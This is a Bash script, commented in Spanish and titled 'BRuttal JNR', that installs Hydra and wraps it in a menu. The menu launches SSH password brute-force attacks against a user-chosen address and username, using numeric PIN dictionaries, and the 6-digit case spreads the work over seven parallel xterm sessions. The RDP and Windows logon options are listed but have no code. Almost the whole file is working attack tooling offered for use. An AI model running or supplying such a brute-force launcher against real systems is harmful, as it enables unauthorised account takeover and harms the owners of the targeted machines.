#se busca la instalacion de hydra, si no esta instalado se instala
sudo apt-get install hydra

#Menu principal de seleccion
clear

echo -e "User name or list:"	
read user
clear && echo -en "\e[3J"
echo -e "\e[4m\e[1m\e[32mBRuttal JNR"	
echo -e "\e[0m\e[5mObjetivo:"
echo -e ""
echo -e "\e[92m	0 - SSH"
echo -e "\e[92m	1 - RDP"
echo -e "\e[92m	2 - Windows LOGON"
read n
case $n in
    0)  echo -e "SSH Address and port objetive xxx.xxx.xxx.xxx:yyyy"	
        read dest
        echo -e "\e[90mDictionary:"
	echo -e ""
	echo -e "\e[72m	0 - Numbers 4 digitos"
	echo -e "\e[72m	1 - Numbers 5 digitos"
	echo -e "\e[72m	2 - Numbers 6 digitos (6 Sessions)"
	read s
	case $s in
		0) xterm -geometry 85x25+0+0 -e "hydra -l $user -P ~/diccionarios/v4.txt ssh://$dest/ -t 20 & exit";;
		1) xterm -geometry 85x25+0+0 -e "hydra -l $user -P ~/diccionarios/v5.txt ssh://$dest/ -t 20 & exit";;
		2) xterm -geometry 75x23+0+0 -bg "#000000" -fg "#99CCFF" -T DICC_V6aa -e "hydra -l $user -P ~/diccionarios/v6aa.txt ssh://$dest/ -t 20"&
		   xterm -geometry 75x23+0+365 -bg "#000100" -fg "#99CCFF" -T DICC_V6ab -e "hydra -l $user -P ~/diccionarios/v6ab.txt ssh://$dest/ -t 20"&
		   xterm -geometry 75x23+0+695 -bg "#000200" -fg "#99CCFF" -T DICC_V6ac -e "hydra -l $user -P ~/diccionarios/v6ac.txt ssh://$dest/ -t 20"&
		   xterm -geometry 75x23+460+0 -bg "#000300" -fg "#99CCFF" -T DICC_V6ad -e "hydra -l $user -P ~/diccionarios/v6ad.txt ssh://$dest/ -t 20"&
		   xterm -geometry 75x23+460+365 -bg "#000400" -fg "#99CCFF" -T DICC_V6ae -e "hydra -l $user -P ~/diccionarios/v6ae.txt ssh://$dest/ -t 20"&
		   xterm -geometry 75x23+460+695 -bg "#000500" -fg "#99CCFF" -T DICC_V6af -e "hydra -l $user -P ~/diccionarios/v6af.txt ssh://$dest/ -t 20"&
		   xterm -geometry 75x23+920+0 -bg "#000600" -fg "#99CCFF" -T DICC_V6ag -e "hydra -l $user -P ~/diccionarios/v6ag.txt ssh://$dest/ -t 20"
		   ;;
	esac
        ;;
esac
